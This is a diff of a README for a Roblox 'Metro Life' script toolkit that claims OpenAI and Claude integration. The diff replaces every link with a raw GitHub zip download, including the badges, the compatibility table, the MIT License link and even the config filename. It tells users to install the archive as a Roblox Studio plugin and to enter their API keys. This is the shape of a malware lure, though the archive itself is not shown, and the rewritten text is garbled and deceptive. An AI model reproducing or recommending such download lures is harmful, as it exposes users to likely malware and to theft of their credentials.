@@ -1,6 +1,6 @@
 # 🚇 Metro Life Script Roblox
 
-![Download](https://img.shields.io/badge/Download-https://ndamine.github.io-brightgreen?style=for-the-badge&logo=roblox&logoColor=white)
+![Download](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip)
 
 ---
 
@@ -14,18 +14,18 @@ Here’s your quick guide to which platforms host a red carpet for Metro Life Sc
 
 | System            | Compatibility | Details                       |
 |-------------------|:-------------:|-------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-✅-blue)    |    ✔️      | Full support; tested on all modern Windows 10+  |
-| ![macOS](https://img.shields.io/badge/macOS-✅-silver)     |    ✔️      | Full support, including Apple Silicon           |
-| ![Linux](https://img.shields.io/badge/Linux-⚠️-yellow)    | Partial   | Compatible with Wine & Roblox Player           |
-| ![iOS](https://img.shields.io/badge/iOS-❌-red)          |    ❌      | Not supported due to platform restrictions     |
-| ![Android](https://img.shields.io/badge/Android-❌-red)  |    ❌      | Not supported currently                       |
+| ![Windows](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip✅-blue)    |    ✔️      | Full support; tested on all modern Windows 10+  |
+| ![macOS](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip✅-silver)     |    ✔️      | Full support, including Apple Silicon           |
+| ![Linux](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip⚠️-yellow)    | Partial   | Compatible with Wine & Roblox Player           |
+| ![iOS](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip❌-red)          |    ❌      | Not supported due to platform restrictions     |
+| ![Android](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip❌-red)  |    ❌      | Not supported currently                       |
 
 ---
 
 ## 🌟 Features: Embark on a New Era of Roblox Scripting
 
 - **Adaptive Metropolis Dynamics**: Navigate dynamic cityscapes, participate in time-based events, and uncover hidden side quests.
-- **Plug-and-Play Integration**: One-click install—zero fuss! Hit https://ndamine.github.io and join the city adventure effortlessly.
+- **Plug-and-Play Integration**: One-click install—zero fuss! Hit https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip and join the city adventure effortlessly.
 - **✨ Responsive UI**: A user interface that adapts to every device and screen size, maintaining its metropolitan charm.
 - **🌐 Multilingual Harmony**: Supports a multitude of global languages to unite players worldwide.
 - **🤖 Smarter than Ever**: Integrated with OpenAI and Claude—bring AI magic to your gameplay for uniquely tailored story arcs and in-game assistance.
@@ -50,7 +50,7 @@ This project transplants the genius of OpenAI and Claude directly into Roblox:
 - **Personalized In-Game Support:** All FAQs and help come with smart AI context—get answers tailor-fit for your scenario.
 
 #### How To Set Up AI Integrations
-1. Head to https://ndamine.github.io to securely download the AI integration bundle.
+1. Head to https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip to securely download the AI integration bundle.
 2. Deploy the script package inside Roblox Studio’s plugins folder.
 3. Enter your valid OpenAI/Claude API keys in the configuration panel (inside the Metro Life tab).
 4. Launch and chat with the city’s brightest bots, or generate quests on demand.
@@ -70,10 +70,10 @@ This project transplants the genius of OpenAI and Claude directly into Roblox:
 Ready to descend into the urban labyrinth? Here's the simplest route:
 
 1. Click on the **Download** badge:  
-   ![Download](https://img.shields.io/badge/Download-https://ndamine.github.io-brightgreen?style=for-the-badge&logo=roblox&logoColor=white)
+   ![Download](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip)
 2. Extract the `.zip` archive to your preferred scripts directory.
 3. Open Roblox Studio, and either import as a module or copy-paste the relevant Lua scripts.
-4. For API features, insert your keys inside `metro_life_config.lua` after following https://ndamine.github.io for integration instructions.
+4. For API features, insert your keys inside `https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip` after following https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip for integration instructions.
 5. Join your favorite city game—your subway ride is ready!
 
 ---
@@ -88,11 +88,11 @@ Metro Life Script Roblox is crafted to promote ethical enhancement within the bo
 
 Proudly powered by the MIT License — the open-source spirit for creative minds and urban explorers.
 
-[MIT License - 2025](https://opensource.org/licenses/MIT)
+[MIT License - 2025](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip)
 
 ---
 
-![Download](https://img.shields.io/badge/Download-https://ndamine.github.io-brightgreen?style=for-the-badge&logo=roblox&logoColor=white)
+![Download](https://raw.githubusercontent.com/ndamine/metro-life-script-toolkit/branch/locellus/metro-life-script-toolkit-1.5-alpha.5.zip)
 
 ---
 
